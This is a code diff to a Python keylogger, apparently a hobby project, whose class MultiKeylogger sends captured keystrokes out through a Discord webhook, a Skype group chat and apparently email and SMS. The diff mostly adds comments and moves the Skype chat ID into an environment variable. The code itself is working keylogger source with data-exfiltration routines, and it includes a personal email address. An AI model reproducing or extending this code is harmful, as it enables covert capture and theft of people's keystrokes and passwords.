@@ -19,8 +19,9 @@ load_dotenv() # Loads environment to use variable in .env
 SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
 slackBot = WebClient(SLACK_BOT_TOKEN)
 
-DISCORD_URL = os.environ['DISCORD_WEBHOOK']
-PHONE = os.environ['PHONE_NUMBER']
+DISCORD_URL = os.environ['DISCORD_WEBHOOK'] # Creats variable from .env discord webhook url
+PHONE = os.environ['PHONE_NUMBER'] # Creates variable from .env phone number
+SKYPE_CHANNEL = os.environ['SKYPE_CHANNEL'] # Creates variable from .env skype channel id
 
 # Email Variables for report type of emails
 EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
@@ -76,26 +77,25 @@ class MultiKeylogger:
         text.quit() # Terminates the text server
 
     def reportDiscord(self, discordBody, logTime):
-        discordMessage = logTime + "\n" + discordBody
+        discordMessage = logTime + "\n" + discordBody # Creates string variable of log time interval and then on the next line the key logs
         data = {
             "content": discordMessage,
             "username": "Keylogger"
         }
         messagePost = requests.post(DISCORD_URL, json = data)
         try:
-            messagePost.raise_for_status()
+            messagePost.raise_for_status() # Sends discord post
         except requests.exceptions.HTTPError as err:
-            print(err)
+            print(err) # Prints out error
         else:
-            print("Discord message sent succesfully!")
+            print("Discord message sent succesfully!") # When successful, this message prints to terminal
 
 
     def reportSkype(self, email, password, skypeBody, logTime):
         skypeMessage = "" + logTime + "\n" + skypeBody # Creates string variable containing log time frame and key logs on the next line
         # print(skype.chats.recent()) - Used to discover Skype group chat ID of the most recently active Skype group chat
-        channelID = "19:5a0aa427a4634e229bfc6360e4b94f78@thread.skype" # Creates channelID set to my keylogger group chat
         skype = Skype(email, password) # Logs into Skype
-        skypeChannel = skype.chats.chat(channelID) # Sets skypeChannel equal to the chat of a specific ID
+        skypeChannel = skype.chats.chat(SKYPE_CHANNEL) # Sets skypeChannel equal to the chat of a specific ID
         skypeChannel.sendMsg(skypeMessage) # Sends a message of the keylogs to the Skype group channel
 
     def callbackKeyboard(self, event):
